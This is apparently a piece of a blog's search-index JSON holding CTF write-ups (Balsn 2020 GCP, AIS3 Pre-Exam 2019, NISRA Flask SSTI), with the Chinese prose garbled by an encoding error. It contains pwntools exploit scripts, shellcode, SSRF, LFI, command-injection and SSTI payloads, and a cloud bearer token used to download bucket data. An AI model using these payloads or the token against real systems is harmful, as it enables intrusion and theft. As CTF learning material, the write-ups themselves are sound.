\"6awpD3oFqMhR8ubjY6vSkg==\",\n      \"crc32c\": \"Reg8Dw==\",\n      \"etag\": \"CNC+uteh/OwCEAE=\",\n      \"timeCreated\": \"2020-11-12T05:22:59.379Z\",\n      \"updated\": \"2020-11-12T05:22:59.379Z\",\n      \"timeStorageClassUpdated\": \"2020-11-12T05:22:59.379Z\"\n    },\n    ...etc\n}\n```\n\nè€Œ `mediaLink` æ‰€å›å‚³çš„å°±æ˜¯ object æª”æ¡ˆï¼Œæ ¼å¼ç‚º `tar.gz`ï¼Œæˆ‘é€™é‚Šå¯ä»¥å¯«å€‹å°å·¥å…·æŠŠå…¨éƒ¨æŠ“ä¸‹ä¾†\n```python\n#!/usr/bin/env python3\nimport requests\nimport json\n\n\nstorageAPI = \"https://storage.googleapis.com/storage/v1/b/asia.artifacts.balsn-ctf-2020-tpc.appspot.com/o/\"\n\nkey = \"ya29.c.KpcB5QeCgub9nZXOQvTrYSa9f5twz8xclgeBH8Q0gnVDhRGubWNl74BNhaRhiEWSGNNW5B-k-r9_DURlKuO6SU3ZDlqHrUahA7QWNMElErrGmJVw3R-7CtsbKA6R4JzyKKtbX2lGv1JE3x6SEugqstPsG5ZFwfse93Y0l2iJixjoWXpQWYK2TmWexLo7CQkpzAacDKuLyiZOlQ\"\n\nheaders = {\n        \"Metadata-Flavor\": \"Google\",\n        \"Authorization\": \"Bearer {}\".format(key)\n        }\n\nr = requests.get(storageAPI, headers=headers)\n\nobjects = json.loads(r.text)\n\nobjects_link = [i['mediaLink'] for i in objects['items']]\n\nfor k,i in enumerate(objects_link):\n    print(k)\n    r = requests.get(i, headers=headers)\n\n    with open(\"{}.tar.gz\".format(k), \"wb\") as f:\n        f.write(r.content)\n```\n\næœ€å¾Œå†æŠŠå…¨éƒ¨ object è§£å£“ç¸®ï¼Œæˆ‘é€™é‚Šç›´æ¥å¯«ä¸€å€‹ shell script `for i in $(ls | grep \"tar.gz\"); do tar zxvf $i; done`\n\né‚£æœ€å¾Œå°±å¯ä»¥çœ‹åˆ°å…¶å¯¦é€™æ˜¯ä¸€å€‹ disk çš„å‚™ä»½ï¼Œåªæ˜¯åˆ‡æˆäº†å¥½å¹¾ä»½\n\n{% asset_img obj_file.png %}\n\n### GET FLAG!\næœ€å¾Œå°±å¯ä»¥åœ¨ `/opt/workdir` ä¸­æ‰¾åˆ° flag äº† (flag-6ba72dc9ffb518f5bcd92eee.txt)\n\nFLAG: `BALSN{What_permissions_does_the_service_account_need}`\n\n","categories":["writeup","balsn20","tpc"]},{"title":"AIS3 Pre-Exam 2019","url":"/zh-tw/2020/ais3-2019/","content":"\n\n![scoreboard](https://i.imgur.com/eUWoRWR.png)\n\n<!-- more -->\n# Pwn\n## Welcome BOF\nåŸ·è¡Œ binary å¾Œå¾—åˆ°ä¸‹åˆ—æ–‡å­—\n`ğŸ‘» They said there need some easy challenges, Okay here is your bof, but you should notice something in ubuntu 18.04.`\n\nåœ¨è¨­ç½®å¥½ ubuntu 18.04 ç„¶å¾Œç”¨ gdb è¿½äº†ä¹‹å¾Œç™¼ç¾ä½¿ç”¨æ™®é€š exploit æ–¹å¼æœƒå°è‡´ binary åœ¨ `xmm` é€™å€‹ assembly ç›´æ¥ sigsegvï¼Œæ‰€ä»¥åœ¨è·³å…¶ä»–å‡½å¼çš„ address å‰åŠ ä¸€å€‹ `ret gadget` å°±å¥½äº†\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\nr = remote('pre-exam-pwn.ais3.org', 10000)\n#r = process('./bof')\ncontext(arch='amd64', log_level='debug')\n\nr.sendlineafter('\\n', '\\x00'*56 + p64(0x0000000000400546) + p64(0x0000000000400687))\nr.interactive()\n```\n\nFlag: `AIS3{TOO0O0O0O0OO0O0OOo0o0o0o00_EASY}`\n\n## ORW\nç°¡å–®çš„ ORWï¼Œå°±ç›´æ¥ä¸Š payload\n\nPayload:\n```python\n#!/usr/bin/env python\n#-*- coding: utf-8 -*-\n\nfrom pwn import *\n\nr = remote('pre-exam-pwn.ais3.org', 10001)\n#r = process('./orw')\ncontext(arch='amd64',log_level='debug')\n\nelf = ELF('./orw')\nbss = elf.bss()\n\nshellcode = ''\nshellcode += asm(\"xor rsi, rsi\")\nshellcode += asm(\"xor rdx, rdx\")\nshellcode += asm(\"mov rax, 0x101010101010101\")\nshellcode += asm(\"push rax\")\nshellcode += asm('mov rax, 0x101010101010101 ^ 0x67616c662f77')\nshellcode += asm('xor [rsp], rax')\nshellcode += asm('mov rax, 0x726f2f656d6f682f')\nshellcode += asm('push rax')\nshellcode += asm(\"mov rdi, rsp\")\nshellcode += asm(\"mov rax, 0x2\")\nshellcode += asm(\"syscall\") #sys_open(\"/home/orw/flag\", 0, 0)\nshellcode += asm(\"mov rdi, rax\")\nshellcode += asm(\"mov rsi, %s\" % hex(bss))\nshellcode += asm(\"mov rdx, 0x30\")\nshellcode += asm(\"xor rax, rax\")\nshellcode += asm(\"syscall\") #sys_read(fd, bss_addr, 0x30)\nshellcode += asm(\"mov rax, 0x1\")\nshellcode += asm(\"mov rdi, 0x1\")\nshellcode += asm(\"mov rsi, %s\" % hex(bss))\nshellcode += asm('mov rdx, 0x30')\nshellcode += asm(\"syscall\") #sys_write(0x1, bss_addr, 0x30)\n\nr.sendlineafter(\"\\n\", shellcode)\nraw_input('#')\nr.sendlineafter('\\n', '\\x00'*40 + p64(0x6010a0))\nprint r.recv()\n```\n\nFlag: `AIS3{B4by_sh311c0d1ng_yeeeeeeeeeeeeeeeeeee_:)}`\n\n# Crypto\n\n## Tcash\né€™é¡Œç›´æ¥çˆ†é–‹å°±å¥½\n\né¡Œç›®ï¼š\n```python\nfrom hashlib import md5,sha256\nfrom secret import FLAG\ncand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890@,- _{}'\n\nmd5s = []\nsha256s = []\nfor f in FLAG :\n    assert f in cand \n    md5s.append( int(md5(f.encode()).hexdigest(),16)%64 )\n    sha256s.append( int(sha256(f.encode()).hexdigest(),16)%64 )\n\n# md5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]\n# sha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]\n```\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom hashlib import md5, sha256\n\ncand = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPWRSTUVWXYZ1234567890@,- _{}'\n\nmd5s = [41, 63, 46, 51, 6, 26, 42, 50, 44, 33, 29, 50, 27, 28, 30, 17, 31, 19, 46, 50, 33, 45, 26, 26, 29, 31, 52, 33, 1, 45, 31, 22, 50, 50, 50, 50, 50, 31, 22, 50, 44, 26, 44, 49, 50, 49, 26, 45, 31, 30, 22, 44, 30, 31, 17, 50, 50, 50, 31, 43, 52, 50, 53, 31, 30, 17, 26, 31, 46, 41, 44, 26, 31, 52, 50, 30, 31, 26, 39, 31, 46, 33, 27, 1, 42, 50, 31, 30, 12, 26, 27, 52, 31, 30, 12, 31, 46, 26, 27, 14, 50, 31, 22, 52, 33, 31, 41, 50, 46, 31, 22, 23, 41, 31, 53, 26, 21, 31, 33, 30, 31, 19, 39, 51, 33, 30, 39, 51, 12, 58, 60, 31, 41, 33, 53, 31, 3, 17, 50, 31, 51, 26, 29, 52, 31, 33, 22, 26, 31, 41, 51, 54, 41, 29, 52, 31, 19, 23, 33, 30, 44, 26, 27, 38, 8, 50, 29, 15]\nsha256s = [61, 44, 3, 14, 22, 41, 43, 30, 49, 59, 58, 30, 11, 3, 24, 35, 40, 46, 3, 42, 59, 36, 41, 41, 41, 40, 9, 59, 23, 36, 40, 33, 42, 42, 42, 42, 42, 40, 44, 42, 49, 24, 49, 28, 42, 33, 24, 36, 40, 24, 33, 10, 24, 40, 35, 42, 42, 42, 40, 39, 9, 42, 3, 40, 24, 35, 24, 40, 3, 61, 49, 24, 40, 9, 42, 24, 40, 41, 17, 40, 12, 57, 11, 23, 43, 42, 40, 24, 18, 41, 11, 9, 40, 24, 18, 40, 3, 41, 11, 12, 42, 40, 44, 9, 59, 40, 61, 42, 3, 40, 44, 13, 61, 40, 3, 24, 29, 40, 59, 24, 40, 19, 18, 6, 59, 24, 18, 6, 22, 0, 39, 40, 61, 57, 3, 40, 17, 35, 42, 40, 58, 24, 58, 9, 40, 59, 44, 24, 40, 61, 48, 52, 61, 58, 9, 40, 19, 13, 59, 24, 53, 41, 11, 55, 55, 42, 58, 18]\nflag = ''\n\nfor j in range(0, 168):\n    for i in cand:\n        print i\n        i_md5 = int(md5(i.encode()).hexdigest(), 16)%64\n        i_sha = int(sha256(i.encode()).hexdigest(), 16)%64\n        if md5s[j] == i_md5 and sha256s[j] == i_sha:\n            flag += i\n            break\n\nprint(\"GETFLAG :)\")\nprint flag\n```\n\nFlag: `AIS3{0N_May_16th @Sead00g said Heeeee ReMEMBerEd tH4t heee UseD thE SAME set 0f On1iNe to01s to S01Ve Rsa AeS RCA DE5 at T-cat-cup, AnD 7he kEys aRE AlWAys TCat2019Key}`\n\n## RSA202\nçµ¦äº†å…©çµ„ c, n\n\n```\n((p-1) % r)**2 + ((r**5 - 1) % p)**2 == 0\n\ne : 540283027\nn1 : r * next_prime(r)\n4147205004274785831839429345273175843810008383684281776384156955313063939697851722599048915934550159810838630817611878938608964209420526101408285259660756614160588966196450613960131\nn2 : p * q\n189499385569262172381048831002627678457833406616949473781611167836895648351112532451760758894923044508366716475548460943196393766620637826332872415510442646680546430198730964714386926052990241201796617017020451667713101333830492208407718631004518421682360782291861821226356182805817583412265318279246843412363933946907203785948691445560941274338686925872683302618016491004951003983008667634680122187498900609531973366891576697127889237270981441848599459412975574704265978641529529466101397272593427889058331942116451739687911633277991689616166740336532002064837594150778620372921356663633832237154225100165980732425950701958080551278623168272993370001609526634867438997949927388057439319287024933300690778630456923952206291\nenc : pow(FLAG1, e, n1)\n1381530128905366229835031885023981456155250417226615037320326874456088155891241824286394351504686598020807575296495059981196560321402599060324041112306873501644386932506341759897439\nenc : pow(FLAG2, e, n2)\n140707322639416047698251987988656851624996420612364458417313556975031926928260994620230402819526867049636870782856159979917800265272030239188402699755346671160152231004482205105848708247326346552857503544647373436454812565553362721157746392553427549801642414716902999579402267404659519821644886491693193213805833150640024188210966690387627927718495600119046377641648420252222832577359835288556915259106349242420185375996603494445374731345308813203766747759356938546946526452742432576477822130704132179704998257468524887132514296404150771137601094599098954349732601437456949710340291117976841757532368528686724239467219905422014324065563266276019549591224395046119238324360770424356549059939445801779363429414873857640198066\n\n```\n\nç”± `n1 = r * next_prime(r)` å¯çŸ¥ n1 çš„ |p-q| æ¥µå°ï¼Œæ•…å¯ä»¥ç”¨ `Fermat's Factorization method` ä¾†é‚„åŸ p, qã€‚\nå¾—åˆ°åŠ å¯†ç¨‹å¼çš„ `r` ä¹‹å¾Œå¯ä»¥é€éæ¨å° `((p-1) % r)**2 + ((r**5 - 1) % p)**2 == 0`ï¼Œå¾—åˆ° `p`\n\næœ€å¾Œå°±å¯ä»¥ç›´æ¥è§£å¯†äº†\n\n`æˆ‘æ˜¯å…¨éƒ¨éƒ½åœ¨ ipython åšï¼Œæ‰€ä»¥æ²’ç•™ script`\n\nFlag: `AIS3{S0me7im3s_I_h4tE_factorDB}`\n\n# Web\n## SimpleWindow\né€™é¡Œæˆ‘ä¸å¤ªçŸ¥é“ç™¼ç”Ÿä»€éº¼äº‹ï¼Œæˆ‘åªçŸ¥é“æˆ‘åŠ äº†ä¸€å€‹ proxy æ”” request ä¹‹å¾Œ flag å°±å½ˆå‡ºä¾†äº† XD\n\nFlag: `AIS3{D0_y0u_kn0w_Serv1ce_W0rker?}`\n\n## Hidden\nçœ‹åŸå§‹ç¢¼æœƒç™¼ç¾æœ‰ `main.019417bd.js` é€™å€‹æª”æ¡ˆï¼Œç™¼ç¾æ˜¯ `Vue.js`\nç„¶å¾Œä¸€é–‹å§‹æœ‰çœ‹åˆ° `flag.js` çš„å­—æ¨£ï¼Œä½†æ˜¯æ²’ç”¨è™•ã€‚\nç›´åˆ°çœ‹åˆ°äº†ä¸€å€‹å¾ˆåƒåŠ è§£å¯†çš„ function\n\nmain.019417bd.js:\n```javascript\nvar r = function() {\n    return function() {\n        var r = Array.prototype.slice.call(arguments),\n            t = r.shift();\n        return r.reverse().map(function(r, e) {\n            return String.fromCharCode(r - t - 25 - e)\n        }).join(\"\")\n    }(12, 144, 165, 95, 167, 140, 95, 157, 94, 164, 91, 122, 111, 102) + 4..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split(\"\").map(function(r) {\n        return String.fromCharCode(r.charCodeAt() + -13)\n    }).join(\"\") + 1234274547001..toString(36).toLowerCase() + 21..toString(36).toLowerCase().split(\"\").map(function(r) {\n        return String.fromCharCode(r.charCodeAt() + -13)\n    }).join(\"\") + 579..toString(36).toLowerCase() + function() {\n        var r = Array.prototype.slice.call(arguments),\n            t = r.shift();\n        return r.reverse().map(function(r, e) {\n            return String.fromCharCode(r - t - 44 - e)\n        }).join(\"\")\n    }(18, 190, 127, 170, 113)\n};\n```\n\nç„¶å¾Œä¸Ÿå» devtool çš„ console åŸ·è¡Œå°±æœƒæœ‰ flag äº†\n\nFlag: `AIS3{4r3_y0u_4_fr0n73nd_g33k?}`\n\n## d1v1n9\nä¸€é–‹å§‹æœ‰å€‹ hint å¯ä»¥é»ï¼Œç„¶å¾Œç™¼ç¾åœ¨ `?path` é€™å€‹åƒæ•¸å¯ä»¥LFIä¹Ÿå¯ä»¥è¨ªå•å…¶ä»–ä¼ºæœå™¨ã€‚\næ´©æ¼ `index.php` ä¹‹å¾Œç™¼ç¾æœ‰ `FLAG_HINT`ï¼Œé‚„æœ‰ä¸€å€‹ ip æª¢æŸ¥ï¼Œä¸€å€‹ flag æª¢æŸ¥\n\nindex.php:\n```php\nif ($_SERVER['REMOTE_ADDR'] == '127.0.0.1') {\n\n    // show path of the flag\n    die($_ENV['FLAG_HINT']);\n}\n\n\nif ($path = @$_GET['path']) {\n    $path = trim($path);\n\n    if (preg_match('/https?:\\/\\/([^s\\/]+)/i', $path, $g)) {\n        // resolve ip address\n        $ip = gethostbyname($g[1]);\n\n        // no local request\n        if ($ip == '127.0.0.1' || $ip == '0.0.0.0')\n            die('Do not request to localhost!');\n    }\n\n    // no flag in path\n    $path = preg_replace('/flag/i', '', $path);\n    if ($content = @file_get_contents($path, FALSE, NULL, 0, 1000)) {\n        // ç”±æ–¼ä»–åªè®€ 1000 bytes æ‰€ä»¥ç„¡æ³•è®€åˆ°å…¨éƒ¨çš„å…§å®¹\n```\n\nç›®æ¨™å°±è®Šæˆå…ˆè®€åˆ° `FLAG_HINT`ï¼Œç„¶å¾Œçœ‹åˆ°ä»–æª¢æŸ¥ ip æ˜¯å…ˆç”¨ `gethostbyname` å°±å¯ä»¥ç”¨ `http://root@127.0.0.1/`ç”¨æœ¬åœ°ç«¯ IP è®€å–ç¶²é \nè©³æƒ…è«‹åƒè€ƒæ©˜å­å¤§å¤§çš„ talk: [link](https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf)\nå†åˆ©ç”¨ `php://filter` ä¾†é¿å…è¢« flag filter æƒåˆ°ï¼Œæœ€å¾Œçš„ `FLAG_HINT` æ˜¯ `FLAG_14d65189669f05d206764c9de441474d.txt`ï¼Œç›´æ¥è¨ªå•å°±å¯ä»¥å¾—åˆ° flag ï¼Œä¸¦ä¸”æç¤ºäº† d1v1n6 deeper é€™é¡Œ\n\nFlag: `AIS3{600d_j0b_bu7_7h15_15_n07_7h3_3nd}`\n\n## d1v1n6 deeper\næ ¹æ“š d1v1n6 å¾—åˆ°çš„æç¤º `Find the other web server in the internal network.`ï¼Œæ•…çŒœæ¸¬æ˜¯åœ¨å…¶ä»– ip è€Œä¸æ˜¯ portã€‚\nåˆ©ç”¨ LFI å¯ä»¥è®€åˆ° `/etc/hosts`\n\n/etc/hosts:\n```\n10:40 $ curl http://pre-exam-web.ais3.org:10103/?path=../../../../../etc/hosts\n127.0.0.1   localhost\n::1 localhost ip6-localhost ip6-loopback\nfe00::0 ip6-localnet\nff00::0 ip6-mcastprefix\nff02::1 ip6-allnodes\nff02::2 ip6-allrouters\n172.22.0.3  b7fba1715fe6\n```\n\nç™¼ç¾æœ‰ `172.22.0.3` é€™ä¸€çµ„å…§éƒ¨ IPï¼Œåœ¨æ‰‹å‹•æ¸¬è©¦å¹¾æ¬¡ä¹‹å¾Œæœƒç™¼ç¾äº‹å¯¦ä¸Šæœ‰ä¸€å€‹ IP `172.22.0.2` server æ˜¯ directory lister\nè§€å¯Ÿäº†ä¸€ä¸‹ä¼¼ä¹æ˜¯æŠŠ GET åƒæ•¸ä¸Ÿé€² bash è£¡é¢è·‘ `ls`ï¼Œä½†æ˜¯ä¸€é–‹å§‹æ¸¬è©¦ä¸€ç›´è©¦ä¸å‡ºä¾†ï¼Œåˆ°å¾Œé¢å°±æ±ºå®šå…ˆç¡è¦ºæ˜å¤©å†èªª XDD\néš”å¤©å†è©¦ä¹‹å¾Œç™¼ç¾å¯ä»¥åˆ©ç”¨ `';id;'` å°±å¯ä»¥é€²è¡Œ command injectionï¼Œä½†æ˜¯å¦‚æœ URL æœ‰ç©ºæ ¼æœƒå¤±æ•—ï¼Œæ‰€ä»¥æˆ‘åˆ©ç”¨ `${IFS}` ä¾†ä»£æ›¿ç©ºæ ¼\n\nPayload: `';cat${IFS}index.php;'`\n\nFlag: `AIS3{y0u_4r3_4bl3_70_d1v3_d33p3r_n3x7_71m3}`\n\n\n# Reverse\n\n## Trivia\n\né–‹ IDA å°±æœ‰çµæœäº†\n\nFlag: `AIS3{This_is_a_reallllllllllly_boariiing_challenge}`\n\n## Tsaibro\nå…©çµ„é»é»ä½œç‚ºä¸€çµ„ï¼Œç„¶å¾Œé€†å‘å°±æœ‰ flag äº†\n\nFlag: `AIS3{y0u_4re_a_b1g_f4n_0f_tsaibro_n0w}`\n\n## HolyGrenade\nå…ˆçµ¦äº†ä¸€å€‹ `pyc` æª”ï¼Œç”¨ `uncompyle2` å°±å¯ä»¥å¾—åˆ°åŸå§‹ç¢¼äº†\n\nde_grenade.py:\n```python\n# uncompyle6 version 3.3.3\n# Python bytecode 3.7 (3394)\n# Decompiled from: Python 2.7.12 (default, Nov 12 2018, 14:36:49)\n# [GCC 5.4.0 20160609]\n# Embedded file name: HolyGrenade.py\n# Size of source mod 2**32: 829 bytes\nfrom secret import flag\nfrom hashlib import md5\n\ndef OO0o(arg):\n    arg = bytearray(arg, 'ascii')\n    for Oo0Ooo in range(0, len(arg), 4):\n        O0O0OO0O0O0 = arg[Oo0Ooo]\n        iiiii = arg[(Oo0Ooo + 1)]\n        ooo0OO = arg[(Oo0Ooo + 2)]\n        II1 = arg[(Oo0Ooo + 3)]\n        arg[Oo0Ooo + 2] = II1\n        arg[Oo0Ooo + 1] = O0O0OO0O0O0\n        arg[Oo0Ooo + 3] = iiiii\n        arg[Oo0Ooo] = ooo0OO\n\n    return arg.decode('ascii')\n\n\nflag += '0' * (len(flag) % 4)\nfor Oo0Ooo in range(0, len(flag), 4):\n    print(OO0o(md5(bytes(flag[Oo0Ooo:Oo0Ooo + 4])).hexdigest()))\n```\n\nä¸¦ä¸”é¡Œç›®ä¹Ÿæœ‰çµ¦å‡ºç¨‹å¼è¼¸å‡ºçš„ hash\n\nflag æ¯å››å€‹å­—æ‹¿å» hashï¼Œæ‰€ä»¥æœ€å¾Œæˆ‘ç”¨çˆ†çš„ (hashd è‡ªå·±æ‰‹å‹•æ…¢æ…¢ä»£)\nPayload:\n```python\n#!/usr/bin/env python3\n\nfrom hashlib import md5\nimport sys\n\nhashd = \"5ae001ebd955475c867617bdb72e7728\"\n#hashd = \"d7939cb11edaa9b1fb05efb4e2946f75\"\n#hashd = \"f1e8fda6c3ff87e43905ea1690624c64\"\n#hashd = \"764d30cb4807c5a870a47b53be6cf662\"\n#hashd = \"9cedd8dee7b5b87838d7a9bed76df8e5\"\n#hashd = \"7d1c09bbf2025facf6bd0fec0ec6a780\"\n#hashd = \"33e4500b205b80e52dd52e796cba8b7d\"\n\nalpha = \"0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_{}\"\n\n\ndef OO0o(arg):\n    arg = bytearray(arg, 'ascii')\n    for i in range(0, len(arg), 4):\n        a = arg[i]\n        b = arg[(i + 1)]\n        c = arg[(i + 2)]\n        d = arg[(i + 3)]\n        arg[i + 2] = d\n        arg[i + 1] = a\n        arg[i + 3] = b\n        arg[i] = c\n\n    return arg.decode('ascii')\n\n#FLAG => AIS3{...}00000..   padding to align 4n\n#\n#flag += '0' * (len(flag) % 4)\n#for i in range(0, len(flag), 4):\nfor i in alpha:\n    for k in alpha:\n        for j in alpha:\n            for m in alpha[-1]:\n                test = i+k+j+m\n                print(\"testing: \", test)\n                data = OO0o(md5(bytes(test, \"utf-8\")).hexdigest())\n                if data == hashd:\n                    sys.exit()\n```\n\nFlag: `AIS3{7here_15_the_k1ll3r_ra661t}`\n\n# Misc\n## KcufsJ\nå¦‚é¡Œç›®åï¼Œæ˜¯ KcufsJ (x\näº‹å¯¦ä¸Šå°±æ˜¯ jsfuck ï¼Œåªä¸éæŠŠ jsfuck çš„å…§å®¹å€’éä¾†\nåˆ©ç”¨ linux çš„ `rev` æŒ‡ä»¤ï¼Œç›´æ¥æŠŠæª”æ¡ˆçš„æ¯ä¸€å€‹å­—éƒ½é¡›å€’ï¼Œå†æ‹¿å» devtool åŸ·è¡Œå°±å¥½äº†\n\nFlag: `AIS3{R33v33rs33_JSFUCKKKKKK}`\n\n## Welcome\nç°½åˆ°é¡Œ\n\n## Are you admin\nç°¡å–®ä¾†èªªå°±æ˜¯ JSONI\n\nPayload:\n```\nYour name:\na\", \"is_admin\":\"yes\", \"test\":{\"a\":\"b\nYour age:\n\"}, \"1\":\"1\n```\n\nFlag: `AIS3{RuBy_js0n_i5_s0_w3ird_0_o}`\n\n## Pysh\nç™¼ç¾ä¸¦æ²’æœ‰éæ¿¾ `$` å’Œå¤§å°å¯«ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨ `$SHELL` ä¾†åŸ·è¡Œä»»æ„æŒ‡ä»¤\n\nFlag: `AIS3{read;$REPLY}`\n\n## Crystal Maze\n\nå°±....æ‰‹å‹•ç¡¬å¹¹ XDD\n\nPayload:\n```python\n#!/usr/bin/env python\n\nfrom pwn import *\n\nr = remote('pre-exam-chals.ais3.org', 10202)\n\nchoice = {\"1\": \"left\", \"2\": 'right', '3': 'up', '4': 'down'}\n\nroute = [2, 3, 3, 3, 3, 1, 3, 3, 2, 2, 2, 4, 4, 4, 4, 4, 4, 2, 2, 2, 3, 2, 3, 2, 2, 2, 2, 3, 3, 2, 2, 4, 4, 4, 2, 2, 3, 3, 3, 3, 3, 3, 1, 3, 3, 2, 3, 3, 3, 3, 3, 3]\n\nfor i in route:\n    r.sendlineafter('move: ', choice[str(i)])\n    print r.recv()\n```\n\n\nFlag: æˆ‘å¿˜è¨˜ç•™äº† QQ\n\n","categories":["writeup","AIS3","2019"]},{"title":"nisra-flask","url":"/en/2020/nisra-flask/","content":"\n\n\n## Description\n```\n{{Hi}}\nlab.nisra.net:8787\n```\n\n## Challenge\nBy viewing the challenge url, we can immediately see the source code.\n<!-- more -->\n```python\nimport flask\nimport os\n\n\napp = flask.Flask(__name__)\napp.config['FLAG'] = os.environ.pop('FLAG')\napp.config['FLASK_DEEPER'] = os.environ.pop('FLASK_DEEPER')\n\n@app.route('/')\ndef index():\n    return flask.render_template('index.html', content=open(__file__).read())\n\n@app.route('/dalun/<path:dalun>')\ndef dalun(dalun):\n    def waf(s):\n        s = s.replace('(', '').replace(')', '')\n        blacklist = ['config', 'self','url_for','request','session','get_flashed_messages']\n        return ''.join(['{{% set {}=None%}}'.format(c) for c in blacklist])+s\n    return flask.render_template_string(waf(dalun))\n\nif __name__ == '__main__':\n    app.run(debug=True)\n```\n\nAs you can see, the exploit should be in `/dalun/<payload>`.\n\nFYI, this is also a modified version for `TWCTF 2018 Shrine`\n\n### Investigate\nIn the source code, you should notice that it bans function calls and `most` of the template variables.\n\nBUT NOT ALL OF THEM THO.\n\nAccording to the [Flask Docs](https://flask.palletsprojects.com/en/1.1.x/templating/#standard-context), one variable is missing from the blacklist. `g`.\n(I asked the author of this challenge, and turns out this is not the intended solution lol)\n\n### Code-Review\nHere is the source code of `g`\n```python\ndef __repr__(self):\n        top = _app_ctx_stack.top\n        if top is not None:\n            return f\"<flask.g of {top.app.name!r}>\"\n        return object.__repr__(self)\n```\nIn the magic method `__repr__` of `g`, there's a `_app_ctx_stack` avaliable in the method.\n\nAnd, testing on the website, we can get the `__repr__` attribute by using `g.__repr__.__class__.__dict__`\n\nResult:\n```\n{'__repr__': <slot wrapper '__repr__' of 'method' objects>, '__hash__': <slot wrapper '__hash__' of 'method' objects>, '__call__': <slot wrapper '__call__' of 'method' objects>, '__getattribute__': <slot wrapper '__getattribute__' of 'method' objects>, '__setattr__': <slot wrapper '__setattr__' of 'method' objects>, '__delattr__': <slot wrapper '__delattr__' of 'method' objects>, '__lt__': <slot wrapper '__lt__' of 'method' objects>, '__le__': <slot wrapper '__le__' of 'method' objects>, '__eq__': <slot wrapper '__eq__' of 'method' objects>, '__ne__': <slot wrapper '__ne__' of 'method' objects>, '__gt__': <slot wrapper '__gt__' of 'method' objects>, '__ge__': <slot wrapper '__ge__' of 'method' objects>, '__get__': <slot wrapper '__get__' of 'method' objects>, '__new__': <built-in method __new__ of type object at 0x7f3743edfb00>, '__reduce__': <method '__reduce__' of 'method' objects>, '__func__': <member '__func__' of 'method' objects>, '__self__': <member '__self__' of 'method' objects>, '__doc__': <attribute '__doc__' of 'method' objects>}\n```\n\nNotice that we now have `__func__` which can get the current function running.\n\nWe look in to `__func__` by using `g.__repr__.__func__.__class__.__dict__`\n\nResult:\n```\n{'__repr__': <slot wrapper '__repr__' of 'function' objects>, '__call__': <slot wrapper '__call__' of 'function' objects>, '__get__': <slot wrapper '__get__' of 'function' objects>, '__new__': <built-in method __new__ of type object at 0x7f3743eebda0>, '__closure__': <member '__closure__' of 'function' objects>, '__doc__': <member '__doc__' of 'function' objects>, '__globals__': <member '__globals__' of 'function' objects>, '__module__': <member '__module__' of 'function' objects>, '__code__': <attribute '__code__' of 'function' objects>, '__defaults__': <attribute '__defaults__' of 'function' objects>, '__kwdefaults__': <attribute '__kwdefaults__' of 'function' objects>, '__annotations__': <attribute '__annotations__' of 'function' objects>, '__dict__': <attribute '__dict__' of 'function' objects>, '__name__': <attribute '__name__' of 'function' objects>, '__qualname__': <attribute '__qualname__' of 'function' objects>}\n```\n\nAND WE GOT `__globals__`!!\n\nSo `g.__repr__.__func__.__globals__` should got `_app_ctx_stack`.\n\n\n## Get Flag\nBecause we now having `_app_ctx_stack`, we now can get the app config.\n`g.__repr__.__func__.__globals__._app_ctx_stack.top.app.config`\n\n\n```\n<Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 